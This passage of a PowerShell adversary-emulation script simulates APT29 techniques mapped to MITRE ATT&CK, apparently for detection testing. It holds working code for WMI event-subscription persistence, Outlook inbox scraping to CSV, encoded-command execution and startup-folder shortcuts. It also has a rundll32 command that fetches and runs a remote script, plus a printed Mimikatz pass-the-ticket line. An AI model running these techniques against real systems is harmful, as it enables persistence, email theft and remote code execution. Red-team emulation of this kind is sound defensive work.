}

# T1084 - WMI Event Subscription
# Source: Atomic Red Team
# Link: https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1084
if ( $T1084 ) {

    $information = @"
APT29 has used WMI event filters to establish persistence.

Windows Management Instrumentation (WMI) can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Adversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system. Adversaries may attempt to evade detection of this technique by compiling WMI scripts into Windows Management Object (MOF) files (.mof extension). Examples of events that may be subscribed to are the wall clock time or the computer's uptime. Several threat groups have reportedly used this technique to maintain persistence.

    - MITRE ATT&CK
    - https://attack.mitre.org/techniques/T1084/

Attack Source:
    - Atomic Red Team
    - https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1084
"@

    if ( $info ) {
        Write-Host ""
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host $information 
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host ""
        break;
    }

    if ( $listVariants ) {
        Write-Host ""
        Write-Host "Only -attack and -cleanup, no other variants for this technique..."
        Write-Host ""
        break;
    }
    
    if ( $attack ) {

        Write-Host "Establishing Persistence via WMI"
        Write-Host "You should see two 'Out-Gridview' windows showing that the Event Filter and CommandLineEventConsumer WMI ovbjects have been created"

        # Attack
        $FilterArgs = @{name='AtomicRedTeam-WMIPersistence-Example';
            EventNameSpace='root\CimV2';
            QueryLanguage="WQL";
            Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"};
        $Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs

        $ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-Example';
            CommandLineTemplate="$($Env:SystemRoot)\System32\notepad.exe";}
        $Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs

        $FilterToConsumerArgs = @{
            Filter = [Ref] $Filter;
            Consumer = [Ref] $Consumer;
        }
        $FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs

        # Verify
        Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer | Out-GridView
        Get-WmiObject -Namespace root/subscription -Class __EventFilter | Out-GridView

    } elseif ( $cleanup ) {

        Write-Host "Revoking Persistence via WMI"
        Write-Host "You should see a single 'Out-Gridview' output showing the Event Filter and CommandLineEventConsumer WMI ovbjects"
        # Atomic Red Team
        $EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = 'AtomicRedTeam-WMIPersistence-Example'"
        $EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = 'AtomicRedTeam-WMIPersistence-Example'"
        $FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query "REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding"

        $FilterConsumerBindingToCleanup | Remove-WmiObject
        $EventConsumerToCleanup | Remove-WmiObject
        $EventFilterToCleanup | Remove-WmiObject

        # Verify
        Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer | Out-GridView
        Get-WmiObject -Namespace root/subscription -Class __EventFilter | Out-GridView

    } else {
        Write-Host ""
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host $information 
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host ""
        Write-Host "Please specify either -attack or -cleanup for this technique..."
        Write-Host ""
    }

}

# T1114 - Email Collection from local Outlook Inbox
# Source: Atomic Red Team
# Link: https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1114
if ( $T1114 ) {
    
    $information = @"
APT29 targeted emails in the infamous DNC hack.

Adversaries may target user email to collect sensitive information from a target.

Files containing email data can be acquired from a user's system, such as Outlook storage or cache files .pst and .ost.

Adversaries may leverage a user's credentials and interact directly with the Exchange server to acquire information from within a network. Adversaries may also access externally facing Exchange services or Office 365 to access email using credentials or access tokens. Tools such as MailSniper can be used to automate searches for specific key words.

    - MITRE ATT&CK
    - https://attack.mitre.org/techniques/T1015/

Attack Source:
    - Atomic Red Team
    - https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1114
"@

    if ( $info ) {
        Write-Host ""
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host $information 
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host ""
        break;
    }

    if ( $listVariants ) {
        Write-Host ""
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host "[ 1 ] - Extract emails and write output to .\emails.csv"
        Write-Host "[ 2 ] - Extract emails and write output to the screen"
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host ""
        break;
    }

    if ( $attack ) {
        function Kill-Outlook {

            # Check to see if outlook is running, and close it to scrape mail data programmatically
            $outlook = Get-Process -Name Outlook -ErrorAction SilentlyContinue
            if ($outlook) {
                $outlook.CloseMainWindow()
                Sleep 5
                if (!$outlook.HasExited) {
                    $outlook | Stop-Process -Force > $null
                }
            }
            Remove-Variable outlook > $null
        }
        
        function Scrape-Outlook {
        
            # Connect to the local outlook inbox and read mail
            Add-type -assembly "Microsoft.Office.Interop.Outlook" | out-null
            $olFolders = "Microsoft.Office.Interop.Outlook.olDefaultFolders" -as [type]
            $inbox = new-object -comobject outlook.application
            $namespace = $inbox.GetNameSpace("MAPI")
            $folder = $namespace.getDefaultFolder($olFolders::olFolderInBox)
            Write-Output "Please be patient, this may take some time..."
            
            # Output the data
            if ( $variant -eq 1 ) {
                $folder.items |
                Select-Object -Property Subject, ReceivedTime, SenderName, ReceivedByName, Body |
                Export-Csv -Path .\emails.csv
            } else {
                $folder.items |
                Select-Object -Property Subject, ReceivedTime, SenderName, ReceivedByName
            }
        }
        
        if ( $variant -eq 1 ) {
            Write-Host "Collecting emails from the locally installed outlook instance"
            Write-Host "Writing output to .\emails.csv"
            Kill-Outlook > $null
            Scrape-Outlook
            Kill-Outlook > $null
        } elseif ( $variant -eq 2 ) {
            Write-Host "Collecting emails from the locally installed outlook instance"
            Write-Host "Displaying output in the terminal"
            Kill-Outlook > $null
            Scrape-Outlook
            Kill-Outlook > $null
        } else {
            Write-Host ""
            Write-Host "You must select an -attack <variant number>! Use -listVariants to see the available options." -ForegroundColor Red
            Write-Host ""
        }
    } elseif ( $cleanup ) {
        Write-Host "No cleanup option available for this attack."
    } else {
        Write-Host ""
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host $information 
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host ""
        Write-Host "Select an -attack <variant> (1-2). Use -listVariants to see the available options."
        Write-Host ""
    }
}

# T1043
if ( $T1043 ) {
    
    $information = @"
APT29 has used Port Number 443 for C2.

Adversaries may communicate over a commonly used port to bypass firewalls or network detection systems and to blend with normal network activity to avoid more detailed inspection. They may use commonly open ports such as:

    * TCP:80 (HTTP)
    * TCP:443 (HTTPS)
    * TCP:25 (SMTP)
    * TCP/UDP:53 (DNS)

They may use the protocol associated with the port or a completely different protocol.

For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), examples of common ports are

    * TCP/UDP:135 (RPC)
    * TCP/UDP:22 (SSH)
    * TCP/UDP:3389 (RDP)

    - MITRE ATT&CK
    - https://attack.mitre.org/techniques/T1043/

Attack Source:
    - VMware Carbon Black - Threat Analysis Unit (TAU)
"@

    if ( $info ) {
        Write-Host ""
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host $information 
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host ""
        break;
    }

    if ( $listVariants ) {
        Write-Host ""
        Write-Host "There is a single variant for this attack simulation"
        Write-Host ""
        break;
    }

    if ( $attack ) {
        Write-Host "Commonly used ports, such as 80 and 443"
        Write-Host "Configure any reverse shells to leverage these ports for callbacks"
        Write-Host "Sending 2 TCP requests to carbonblack.com over ports 443 and 80"
        Write-Host "    Test-Connection -TargetName carbonblack.com -TCPPort 443" -ForegroundColor Gray
        Write-Host "    Test-Connection -TargetName carbonblack.com -TCPPort 80" -ForegroundColor Gray
        Test-Connection -TargetName carbonblack.com -TCPPort 443
        Test-Connection -TargetName carbonblack.com -TCPPort 80
        Write-Host "Connection Testing complete - feel free to modify and re-test using other domains/IPs and ports"
    } elseif ( $cleanup ) {
        Write-Host "No cleanup option available for this attack."
        break;
    } else {
        Write-Host ""
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host $information 
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host ""
        Write-Host "Select either -attack or -cleanup options..."
        Write-Host ""
    }
}

# T1027
# Source: Atomic Red Team
# Link: https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1027
if ( $T1027 ) {
    
    $information = @"
APT29 leverages PowerShell to utilize Base64 for obfuscation.

Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.

    - MITRE ATT&CK
    - https://attack.mitre.org/techniques/T1027/

Attack Source:
    - Atomic Red Team
    - https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1027
"@

    if ( $info ) {
        Write-Host ""
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host $information 
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host ""
        break;
    }

    if ( $listVariants ) {
        Write-Host ""
        Write-Host "There is only one variant for this technique"
        Write-Host ""
        break;
    }

    if ( $attack ) {
    
        Write-Host "Creating and executing base64-encoded PowerShell code."
        $OriginalCommand = 'Write-Host "Hello from APT29"'
        $Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
        $EncodedCommand =[Convert]::ToBase64String($Bytes)
        $EncodedCommand
        powershell.exe -EncodedCommand $EncodedCommand
    
    } elseif ( $cleanup ) {
        Write-Host "No cleanup option available for this attack."

    } else {
        Write-Host ""
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host $information 
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host ""
        Write-Host "Select either -attack or -cleanup options..."
        Write-Host ""
    }
}

# T1097
if ( $T1097 ) {
    
    $information = @"
APT29 used Kerberos ticket attacks for lateral movement.

Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system.

In this technique, valid Kerberos tickets for Valid Accounts are captured by Credential Dumping. A user's service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access.

    - MITRE ATT&CK
    - https://attack.mitre.org/techniques/T1097/

Attack Source:
    - Manual Simulation (ಥ⌣ಥ)
"@
    
    if ( $info ) {
        Write-Host ""
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host $information 
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host ""
        break;
    }

    if ( $listVariants ) {
        Write-Host ""
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host "Leverage a PowerShell tool such as Invoke-PSImage to hide data within a target image file"
        Write-Host "https://github.com/peewpw/Invoke-PSImage"
        Write-Host ""
        Write-Host "If Mimikatz is already loaded, utilize the following command to execute the attack:"
        Write-Host "mimikatz # kerberos::ptt #{user_name}@#{domain}" -ForegroundColor gray
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host ""
        break;
    } else {
        Write-Host ""
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host $information 
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host ""
        Write-Host "Leverage a PowerShell tool such as Invoke-PSImage to hide data within a target image file"
        Write-Host "https://github.com/peewpw/Invoke-PSImage"
        Write-Host ""
        Write-Host "If Mimikatz is already loaded, utilize the following command to execute the attack:"
        Write-Host "mimikatz # kerberos::ptt #{user_name}@#{domain}" -ForegroundColor gray
        Write-Host ""
    }
}

# T1085 - Rundll32
# Source: Atomic Red Team
# Link: https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1085
if ( $T1085 ) {
    
    $information = @"
APT29 has used rundll32.exe for execution.

The rundll32.exe program can be called to execute an arbitrary binary. Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of the rundll32.exe process because of whitelists or false positives from Windows using rundll32.exe for normal operations.

    - MITRE ATT&CK
    - https://attack.mitre.org/techniques/T1085/

Attack Source:
    - Atomic Red Team
    - https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1085
"@

    if ( $info ) {
        Write-Host ""
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host $information 
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host ""
        break;
    }

    if ( $listVariants ) {
        Write-Host ""
        Write-Host "There is a single variant for this attack"
        Write-Host ""
        break;
    }

    if ( $attack ) {
        Write-Host "Launching Notepad via Rundll, through an outbound call to Pastebin"
        Write-Host 'cmd.exe /C "rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1085/T1085.sct");"' -ForegroundColor Gray
        cmd.exe /C 'rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1085/T1085.sct");'
        Write-Host "Feel free to customize and run with your own payloads for a more realistic simulation"
        Write-Host "There is also a reverse-shell option available via:"
        Write-Host "    Invoke-APT29 -shell -rundll32" -ForegroundColor Gray
    } elseif ( $cleanup ) {
        Write-Host "No cleanup option available for this attack."
    } else {
        Write-Host ""
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host $information 
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host ""
        Write-Host "Select either -attack or -cleanup options..."
        Write-Host ""
    }
}

# T1023
# Source: Atomic Red Team
# Link: https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1023
if ( $T1023 ) {
    
    $information = @"
APT29 drops a Windows shortcut file for execution.

Shortcuts or symbolic links are ways of referencing other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process. Adversaries could use shortcuts to execute their tools for persistence. They may create a new shortcut as a means of indirection that may use Masquerading to look like a legitimate program. Adversaries could also edit the target path or entirely replace an existing shortcut so their tools will be executed instead of the intended legitimate program.

    - MITRE ATT&CK
    - https://attack.mitre.org/techniques/T1023/

Attack Source:
    - Atomic Red Team
    - https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1023
"@

    if ( $info ) {
        Write-Host ""
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host $information 
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host ""
        break;
    }

    if ( $listVariants ) {
        Write-Host ""
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host "[ 1 ] - Create lnk shortcut to cmd in startup folders"
        Write-Host "[ 2 ] - Shortcut Modification"
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host ""
        break;
    }

    if ( $attack ) {
        if ( $variant -eq 1 ) {
            Write-Host "Generating T1023.lnk files and placing them in the following locations:"
            Write-Host "    $env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\T1023.lnk" -ForegroundColor Gray
            Write-Host "    $env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\T1023.lnk" -ForegroundColor Gray
            Write-Host "Click on these files to trigger the simulated attack, which will launch cmd.exe"
            
            # AppData File
            $Shell = New-Object -ComObject ("WScript.Shell")
            $ShortCut = $Shell.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\T1023.lnk")
            $ShortCut.TargetPath="cmd.exe"
            $ShortCut.WorkingDirectory = "C:\Windows\System32";
            $ShortCut.WindowStyle = 1;
            $ShortCut.Description = "T1023.";
            $ShortCut.Save()

            # ProgramData File
            $Shell = New-Object -ComObject ("WScript.Shell")
            $ShortCut = $Shell.CreateShortcut("$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\T1023.lnk")
            $ShortCut.TargetPath="cmd.exe"
            $ShortCut.WorkingDirectory = "C:\Windows\System32";
            $ShortCut.WindowStyle = 1;
            $ShortCut.Description = "T1023.";
            $ShortCut.Save()
        } elseif ( $variant -eq 2 ) {
            Write-Host "Simulating shortcut modification followed by execution"
            Write-Host "Example shortcut (*.lnk , .url) strings"
            gci -path "C:\Users" -recurse -include *.url -ea SilentlyContinue | Select-String -Pattern "exe" | FL
        } else {
            Write-Host "You must select a variant number. Available options are 1 and 2."
        }
    } elseif ( $cleanup ) {
        Write-Host "Removing generated T1023.lnk files from the following locations:"
        Write-Host "    $env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\T1023.lnk" -ForegroundColor Gray
        Write-Host "    $env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\T1023.lnk" -ForegroundColor Gray
        Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\T1023.lnk"
        Remove-Item "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\T1023.lnk"
    } else {
        Write-Host ""
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host $information 
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host ""
        Write-Host "Select either -attack or -cleanup options..."
        Write-Host ""
    }
}

# T1095
if ( $T1095 ) {
    
    $information = @"
APT29 uses TCP for C2 communications.

Use of a standard non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).

    - MITRE ATT&CK
    - https://attack.mitre.org/techniques/T1015/

Attack Source:
    - VMware Carbon Black - Threat Analysis Unit (TAU)
"@

    if ( $info ) {
        Write-Host ""
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host $information 
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host ""
        break;
    }

    if ( $listVariants ) {
        Write-Host ""
        Write-Host "There is a single variant for this attack"
        Write-Host ""
        break;
    }

    if ( $attack ) {
        Write-Host "Common TCP ports, such as 80 and 443, were leveraged extensively by APT29"
        Write-Host "Running the following commands to make 2 separate outbound network connections:"
        Write-Host "    Test-Connection -TargetName carbonblack.com -TCPPort 443" -ForegroundColor Gray
        Write-Host "    Test-Connection -TargetName carbonblack.com -TCPPort 80" -ForegroundColor Gray
        Test-Connection -TargetName carbonblack.com -TCPPort 443
        Test-Connection -TargetName carbonblack.com -TCPPort 80
        Write-Host "Connection Testing complete - feel free to modify and re-test using other domains/IPs and ports"
    } elseif ( $cleanup ) {
        Write-Host "No cleanup option available for this attack."
    } else {
        Write-Host ""
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host $information 
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host ""
        Write-Host "Select either -attack or -cleanup options..."
        Write-Host ""
    }
}

}